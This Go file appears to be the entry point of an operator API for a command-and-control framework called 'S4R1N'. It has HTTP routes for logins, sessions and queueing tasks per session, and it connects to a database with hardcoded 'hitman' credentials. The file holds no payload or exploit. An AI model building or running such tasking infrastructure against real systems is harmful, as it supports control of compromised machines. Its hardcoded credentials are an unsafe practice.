package main

import (
	"database/sql"
	"fmt"
	"log"
	"net/http"

	"github.com/gorilla/mux"
)

const (
	Art = `
                                                                       
	────────────────▌─────────────────
	───────────────▄▌─────────────────
	──────────────▐█──────────────────
	──────────────▐█──────────────────
	───────────────█▌─▀▀███▄──────────
	───────────────██────▀█████▄──────
	──────▄▄███▀▀──▐█▌─────▀█████▄────
	──▄▄████▀▀─────▐█▌─────▄███▀▀─────
	──▀█████▄──────██────▄███▀────────
	──────▀███▄▄▄▄────▄███▀▀─────────▄
	─────────▀█████▌▐███───────────▄██
	▄───────────███▌▐████▄▄─────▄████▀
	██▄────▄▄██████▌▐████████▄▄█████▀─
	███████████████▌▐██▀───▀███████───
	─██████▀───▀▀██▌▐▀──────█████▀────
	──▀████▄──────▀▌──────▄████▀──────
	─────▀███▄────────▄▄████▀▀────────
	────────▀▀█▄ ───────────S4R1N-────
	──────────────────────────────────      
                                 
	- Operator API -
`
)

var db *sql.DB

func handleRequests() {

	myRouter := mux.NewRouter().StrictSlash(true)

	myRouter.HandleFunc("/login", login).Methods("POST")
	myRouter.HandleFunc("/adduser", adduser).Methods("POST")
	myRouter.HandleFunc("/sessions", sessions).Methods("GET")
	myRouter.HandleFunc("/tasks/{sessionid}", tasks).Methods("GET")
	myRouter.HandleFunc("/task/{sessionid}/taskid/{taskid}", task).Methods("GET")
	myRouter.HandleFunc("/task/{sessionid}", queueTask).Methods("POST")
	myRouter.HandleFunc("/changepassword", changePassword).Methods("POST")

	log.Fatal(http.ListenAndServe(":80", myRouter))

}

func main() {

	db = conn("localhost", 5432, "hitman", "hitman", "hitman")

	fmt.Println(Art)
	fmt.Println("[+] Connected to the DB")
	fmt.Println("[+] Setting up API")
	handleRequests()

}
